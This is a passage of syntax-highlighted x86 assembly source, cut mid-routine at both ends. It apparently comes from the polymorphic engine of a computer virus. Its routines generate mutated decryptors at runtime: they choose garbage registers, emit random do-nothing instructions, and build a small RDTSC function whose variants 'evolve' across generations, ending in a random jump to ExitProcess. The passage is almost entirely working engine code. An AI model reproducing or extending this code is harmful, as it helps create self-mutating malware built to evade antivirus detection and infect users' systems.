                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function creates a check with 0</span><span class="sc0">
</span><span class="sc5">Poly_MakeCheckWith0</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X016_19</span><span class="sc0">  </span><span class="sc1">; WEIGHT_X016</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">            </span><span class="sc1">; Composed option: MOV Reg2,0 /</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;                  CMP Reg,Reg2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">      </span><span class="sc1">; This one is direct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_MakeCheckWith0</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function makes a CALL to a memory address. It's used mainly for API</span><span class="sc0">
</span><span class="sc1">;; calls. We can do both simple and composed CALLs.</span><span class="sc0">
</span><span class="sc5">Poly_DoCALLMem</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X016_19</span><span class="sc0"> </span><span class="sc1">; WEIGHT_X017</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Move the address to a garbage register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">    </span><span class="sc1">; Call to [Register]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0800h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">   </span><span class="sc1">; Call the address directly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoCALLMem</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This piece of code generates a RDTSC/RET function in runtime once in</span><span class="sc0">
</span><span class="sc1">;; every 4 created decryptors. The mini-routine has some variants, to make</span><span class="sc0">
</span><span class="sc1">;; it a little "polymorphic" :).</span><span class="sc0">
</span><span class="sc1">;; There isn't a standard way of getting a random number in runtime without</span><span class="sc0">
</span><span class="sc1">;; using APIs (to my knowledge), since FS:[xxx] addresses depend on the</span><span class="sc0">
</span><span class="sc1">;; win32 system we use (Win9x or WinNT).</span><span class="sc0">
</span><span class="sc5">Poly_MakeRandomExecution</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X016_19</span><span class="sc0">  </span><span class="sc1">; WEIGHT_X018</span><span class="sc0">
                                    </span><span class="sc1">; Only a prob. of making this of 1/4!</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; (at first generation, after that it</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Normal</span><span class="sc0">      </span><span class="sc1">; evolves)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0">   </span><span class="sc1">; Select new registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Construct the mini-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; function here.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">         </span><span class="sc1">; Get a random offset inside the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">       </span><span class="sc1">; first 20h bytes of the decryptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; data section, and construct the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">       </span><span class="sc1">; 4-byte function there.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontAddMore</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc5">@@DontAddMore</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Set the IndexRegister with this</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0"> </span><span class="sc1">; value.</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                     </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Save it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Move it to BufferReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0">
        </span><span class="sc5">@@RDTSC_Option0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X016_19</span><span class="sc0"> </span><span class="sc1">; Get one of the three possible</span><span class="sc0">
                </span><span class="sc1">; WEIGHT_X019                 ; variants.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RDTSC_Option2</span><span class="sc0">    </span><span class="sc1">; Garbage at the beginning</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X020_23</span><span class="sc0"> </span><span class="sc1">; WEIGHT_X020</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RDTSC_Option3</span><span class="sc0">    </span><span class="sc1">; Garbage in the middle</span><span class="sc0">
        </span><span class="sc5">@@RDTSC_Option1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FF000000h</span><span class="sc0">  </span><span class="sc1">; Garbage at the end (a random byte :)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000C3310Fh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RDTSC_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@RDTSC_Option2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetGarbageOneByter</span><span class="sc0">
                </span><span class="sc1">;and     eax, 0000000FFh ; Set a one-byte do-nothing instrc.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3310F00h</span><span class="sc0">  </span><span class="sc1">; at the beginning</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RDTSC_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@RDTSC_Option3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetGarbageOneByter</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; Set a one-byter in the middle</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C300310Fh</span><span class="sc0">
        </span><span class="sc5">@@RDTSC_SetInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Now make the value in EAX from the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; random value we made before.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoADDRegValue</span><span class="sc0"> </span><span class="sc1">; Make it by ADD (or SUB). It's</span><span class="sc0">
                                           </span><span class="sc1">; a way of encrypting it.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">         </span><span class="sc1">; Make a MOV [IndexReg],BufferReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0800h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">        </span><span class="sc1">; Now make CALL IndexReg.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; It will return a random value in</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; EAX</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Set IndexReg as EAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; Destroy the other registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X020_23</span><span class="sc0">    </span><span class="sc1">; TEST or AND/CMP?</span><span class="sc0">
                                               </span><span class="sc1">; WEIGHT_X021</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectTEST</span><span class="sc0">
      </span><span class="sc5">@@ANDandCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">; Make AND EAX,2^rnd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_ReverseTranslation</span><span class="sc0"> </span><span class="sc1">; Set the register that will</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; be translated to EAX with</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@GetARandomPowerOf2</span><span class="sc0">       </span><span class="sc1">; the expander</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_ReverseTranslation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_MakeCheckWith0</span><span class="sc0">   </span><span class="sc1">; Make a check with 0</span><span class="sc0">
      </span><span class="sc5">@@SetTheJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X020_23</span><span class="sc0">  </span><span class="sc1">; WEIGHT_X022</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">              </span><span class="sc1">; Set a random JZ/JNZ to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; ExitProcess.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_JumpRandomExecution</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set the address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; of the jump to complete and</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                          </span><span class="sc1">; return.</span><span class="sc0">

       </span><span class="sc5">@@DirectTEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">      </span><span class="sc1">; The direct test is TEST EAX,xxxx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xpand_ReverseTranslation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
